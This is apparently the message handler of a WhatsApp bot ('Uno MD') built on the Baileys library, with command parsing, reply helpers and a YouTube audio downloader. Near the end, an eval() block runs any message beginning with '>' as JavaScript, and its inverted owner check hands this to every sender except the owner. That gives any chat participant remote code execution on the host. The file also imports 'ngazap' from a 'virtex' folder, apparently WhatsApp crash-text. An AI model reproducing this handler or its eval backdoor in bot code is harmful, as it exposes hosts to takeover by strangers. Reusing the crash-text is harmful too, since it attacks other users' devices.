require('./config.js')
process.on("uncaughtException", console.error);
const baileys = require('@whiskeysockets/baileys')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, isBaileys, MessageType, downloadContentFromMessage, Mimetype } = baileys
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const scr = require('@bochilteam/scraper')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const ytdl = require("ytdl-core")
const fetch = require('node-fetch')
const cheerio = require("cheerio")
const crypto = require("crypto")
const Jimp = require("jimp")
const { fromBuffer } = require('file-type')
const { sizeFormatter} = require("human-readable")
const { color, bgcolor, mycolor } = require('./color')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, jsonformat, getGroupAdmins, formatp, tanggal, formatDate, getTime, sleep, clockString, runtime, format, parseMention, getRandom } = require('./fetcher')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif')
const thumb = fs.readFileSync ('./lib/baseikal/image/bacot.jpg')
const { ngazap } = require('./baseikal/virtex/ngazap')
let wm = 'Uno MD'
const {
TelegraPh,
UploadFileUgu,
webp2mp4File,
floNime
} = require('./uploader')
const {
toAudio,
toPTT,
toVideo,
ffmpeg
} = require('./converter')

const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.packname, participant: '0@s.whatsapp.net'}, message: { 'contactMessage': { 'displayName': `${global.nama}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${global.nama};;;\nFN:${global.nama}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}

module.exports = uno = async (uno, m, chatUpdate, store) => {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const { color, bgcolor, pickRandom, randomNomor } = require('./console.js')
const { audio } = baileys
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const antilink = JSON.parse(fs.readFileSync('./lib/database/antilink.json'))
const pushname = m.pushName || "No Name"
const botNumber = await uno.decodeJid(uno.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isSticker = (type == 'stickerMessage')
const { chats } = m
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')

const isGroup = m.key.remoteJid.endsWith('@g.us')
const groupMetadata = m.isGroup ? await uno.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAntiLink = antilink.includes(from) ? true : false

const reply = (teks) => {
return uno.sendMessage(m.chat, { text: teks ,contextInfo:{forwardingScore: 9999999, isForwarded: true}}, {})
}

const replyy = (teks) => {
return uno.sendMessage(m.chat, { text: teks ,contextInfo:{forwardingScore: 9999999, isForwarded: false}}, { quoted: fpay })
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await uno.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(mess.Iv)
}}

switch(command) { 
case 'sowodjeiekk':
m.reply('iwkekek')
break
default:
}

if (budy.startsWith('>')) {
if (!isCreator)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
replyy(String(err))
}
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
